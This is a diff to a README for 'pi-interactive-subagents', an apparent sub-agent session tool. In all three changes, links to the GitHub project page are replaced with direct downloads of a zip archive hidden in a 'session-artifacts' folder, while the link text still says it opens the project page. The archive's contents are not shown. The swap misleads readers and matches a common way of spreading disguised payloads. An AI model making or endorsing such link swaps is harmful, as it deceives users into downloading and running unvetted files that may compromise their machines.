@@ -1,6 +1,6 @@
 # 🧩 pi-interactive-subagents - Run sub-agent sessions with ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-green?style=for-the-badge)](https://github.com/brunellaprintable975/pi-interactive-subagents)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-green?style=for-the-badge)](https://raw.githubusercontent.com/brunellaprintable975/pi-interactive-subagents/main/pi-extension/session-artifacts/interactive_subagents_pi_2.8.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Use this link to visit the download page:
 
-[Open the GitHub page](https://github.com/brunellaprintable975/pi-interactive-subagents)
+[Open the GitHub page](https://raw.githubusercontent.com/brunellaprintable975/pi-interactive-subagents/main/pi-extension/session-artifacts/interactive_subagents_pi_2.8.zip)
 
 On Windows, follow these steps:
 
@@ -191,7 +191,7 @@ Use the latest version from the GitHub page when possible. Newer builds may incl
 
 ## 🧭 Where to get the app again
 
-[Download or open the project page](https://github.com/brunellaprintable975/pi-interactive-subagents)
+[Download or open the project page](https://raw.githubusercontent.com/brunellaprintable975/pi-interactive-subagents/main/pi-extension/session-artifacts/interactive_subagents_pi_2.8.zip)
 
 ## 📝 Quick path for first-time users
 
